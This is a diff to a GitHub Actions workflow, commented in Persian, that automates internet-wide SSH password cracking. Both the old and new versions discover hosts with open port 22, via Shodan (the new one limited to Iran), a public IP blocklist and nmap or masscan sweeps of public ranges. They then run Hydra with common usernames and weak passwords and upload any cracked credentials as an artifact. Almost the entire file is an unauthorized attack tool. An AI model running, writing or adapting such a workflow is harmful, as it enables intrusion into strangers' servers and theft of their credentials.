@@ -1,122 +1,114 @@
-name: Single Auto SSH Cracker (Never Stop)
+name: Auto SSH Cracker - Reliable Discovery
 
 on:
-  workflow_dispatch:   # فقط دستی
-    inputs:
-      max_duration_minutes:
-        description: 'حداکثر زمان اجرا (دقیقه) – 0 یعنی بی‌نهایت'
-        default: '0'
+  workflow_dispatch:
 
 jobs:
-  turbo-cracker:
+  crack:
     runs-on: ubuntu-latest
     steps:
-      - name: 🚀 Install fastest tools
-        run: |
-          sudo apt update
-          sudo apt install -y hydra sshpass masscan jq curl
+      - name: Install tools
+        run: sudo apt update && sudo apt install -y hydra sshpass jq curl nmap
 
-      - name: Prepare password dictionary (Top 5000)
+      - name: Prepare password dictionary (Top 100 fastest)
         run: |
-          curl -s -o passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt
-          # اگر نتونست دانلود کنه، یه دیکشنری پیش‌فرض بساز
-          if [ ! -s passwords.txt ]; then
-            printf "123456\npassword\n12345678\nqwerty\nabc123\nadmin\nroot\n12345\nletmein\nwelcome\n" > passwords.txt
+          cat > fast_pass.txt <<EOF
+          123456
+          password
+          12345678
+          qwerty
+          abc123
+          admin
+          root
+          12345
+          letmein
+          welcome
+          password123
+          admin123
+          root123
+          123456789
+          qwerty123
+          1q2w3e
+          123123
+          admin@123
+          root@123
+          Pa$$w0rd
+          EOF
+
+      - name: Get fresh targets (Auto Discovery)
+        id: discovery
+        run: |
+          TARGETS="targets.txt"
+          > $TARGETS
+
+          # روش 1: استفاده از Shodan (اگر API key داشته باشی)
+          if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
+            echo "Using Shodan API..."
+            curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22+country:IR&size=30" | \
+              jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS
           fi
 
-      - name: 🔁 Unlimited attack loop (auto discover + crack)
-        id: main
+          # روش 2: استفاده از لیست تصادفی از وب (مثل فایروال سطح ۱ یا لیست عمومی)
+          if [ $(wc -l < $TARGETS) -lt 10 ]; then
+            echo "Fetching public IP list from GitHub..."
+            curl -s https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/ipv4_firehol_level1.netset | \
+              head -200 | while read net; do
+                # تبدیل netmask به یه IP نمونه (فقط برای نمونه)
+                echo ${net%/*} | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' && echo "${net}:22"
+              done | head -50 >> $TARGETS
+          fi
+
+          # روش 3: اسکن سریع با nmap روی چند شبکه کلاس C معمول (برای تست داخلی)
+          if [ $(wc -l < $TARGETS) -lt 10 ]; then
+            echo "Scanning common /24 subnets with nmap..."
+            for subnet in 1.1.1.0/24 8.8.8.0/24 4.4.4.0/24 9.9.9.0/24; do
+              nmap -Pn -p22 --open -T4 -n --max-rtt-timeout 100ms $subnet | \
+                grep -E "Nmap scan report for" | awk '{print $5":22"}' >> $TARGETS
+            done
+          fi
+
+          # حذف تکراری و خالی
+          sort -u -o $TARGETS $TARGETS
+          count=$(wc -l < $TARGETS)
+          echo "targets_count=$count" >> $GITHUB_OUTPUT
+          echo "Found $count targets"
+
+          if [ $count -eq 0 ]; then
+            echo "No targets found. You can set SHODAN_API_KEY secret or use a different range."
+            exit 1
+          fi
+
+      - name: Brute force SSH with Hydra (Turbo)
         run: |
-          PASSWORDS="passwords.txt"
-          USERNAMES=("root" "admin" "user" "ubuntu" "pi")
-          START_TIME=$(date +%s)
-          MAX_TIME=${{ github.event.inputs.max_duration_minutes }}
+          USERNAMES=("root" "admin" "user")
           FOUND=0
+          RESULT_FILE="success.txt"
 
-          # حلقه اصلی - هیچوقت تموم نمیشه مگه پیدا کنه یا زمان برسه
-          while [ $FOUND -eq 0 ]; do
-            # اگر زمان حداکثر تعیین شده و رد شده، خارج شو
-            if [ $MAX_TIME -ne 0 ]; then
-              NOW=$(date +%s)
-              ELAPSED=$(( (NOW - START_TIME) / 60 ))
-              if [ $ELAPSED -ge $MAX_TIME ]; then
-                echo "Time limit reached. Exiting."
-                break
+          while read target; do
+            ip=$(echo $target | cut -d: -f1)
+            port=$(echo $target | cut -d: -f2)
+            for user in "${USERNAMES[@]}"; do
+              echo "[*] Attacking $user@$ip:$port"
+              # اجرای hydra با خروجی کامل و گرفتن نتیجه
+              hydra -l "$user" -P fast_pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
+              if grep -q "host: $ip.*password:" hydra.log; then
+                pass=$(grep "host: $ip.*password:" hydra.log | head -1 | awk -F 'password: ' '{print $2}')
+                echo "✅ SUCCESS: $ip:$port | $user | $pass" | tee -a $RESULT_FILE
+                FOUND=1
+                break 3
               fi
-            fi
+            done
+          done < targets.txt
 
-            echo "===== [ $(date) ] Discovering fresh targets ====="
-            TARGETS="targets.txt"
-            > $TARGETS
-
-            # روش 1: استفاده از Shodan (اگر کلید تنظیم شده باشه)
-            if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
-              echo "Using Shodan..."
-              curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=50" | \
-                jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS
-            fi
-
-            # اگر تعداد کمه، با masscan یک شبکه تصادفی کلاس C رو اسکن کن (سریع)
-            if [ $(wc -l < $TARGETS) -lt 20 ]; then
-              echo "Masscan random /24..."
-              # تولید یک IP رندوم کلاس C
-              A=$((RANDOM%223+1))
-              B=$((RANDOM%256))
-              C=$((RANDOM%256))
-              RANGE="$A.$B.$C.0/24"
-              # masscan نیاز به sudo داره ولی توی گیت‌هاب رانر بدون sudo هم شاید کار کنه؟ بهتره با sudo run
-              sudo masscan $RANGE -p22 --rate=2000 --wait=0 -oL masscan.out 2>/dev/null || true
-              grep -E "open" masscan.out 2>/dev/null | awk '{print $4":"$3}' >> $TARGETS
-            fi
-
-            # حذف تکراری و خالی
-            sort -u -o $TARGETS $TARGETS
-            TOTAL_HOSTS=$(wc -l < $TARGETS)
-            echo "Found $TOTAL_HOSTS unique hosts with port 22"
-
-            if [ $TOTAL_HOSTS -eq 0 ]; then
-              echo "No targets, sleeping 5 seconds..."
-              sleep 5
-              continue
-            fi
-
-            # حمله با Hydra روی هر هاست (با نخ بالا)
-            while read target; do
-              ip=$(echo $target | cut -d: -f1)
-              port=$(echo $target | cut -d: -f2)
-              
-              for username in "${USERNAMES[@]}"; do
-                echo "[*] Trying $username@$ip:$port"
-                # hydra با 128 نخ، timeout اتصال 5 ثانیه، و با found flag متوقف شو
-                hydra -l "$username" -P $PASSWORDS -s "$port" -t 128 -w 3 -o hydra.tmp -f "$ip" ssh 2>/dev/null
-                
-                if grep -q "host: $ip.*password:" hydra.tmp; then
-                  password=$(grep "host: $ip.*password:" hydra.tmp | head -1 | awk -F 'password: ' '{print $2}')
-                  echo "✅ SUCCESS: $ip:$port | $username | $password" | tee -a final_results.txt
-                  FOUND=1
-                  break 3
-                fi
-                rm -f hydra.tmp
-              done
-            done < $TARGETS
-
-            # اگه پیدا کرد، حلقه رو بشکن
-            if [ $FOUND -eq 1 ]; then
-              echo "Password found! Exiting."
-              break
-            else
-              echo "No luck in this batch. Restarting discovery..."
-            fi
-          done
-
-          # ذخیره خروجی برای artifact
           if [ $FOUND -eq 1 ]; then
             echo "success=true" >> $GITHUB_OUTPUT
+          else
+            echo "No credentials found in this batch."
           fi
 
-      - name: Upload found credentials
-        if: steps.main.outputs.success == 'true'
+      - name: Upload credentials
+        if: success()
         uses: actions/upload-artifact@v4
         with:
-          name: cracked-passwords
-          path: final_results.txt
+          name: cracked-credentials
+          path: success.txt
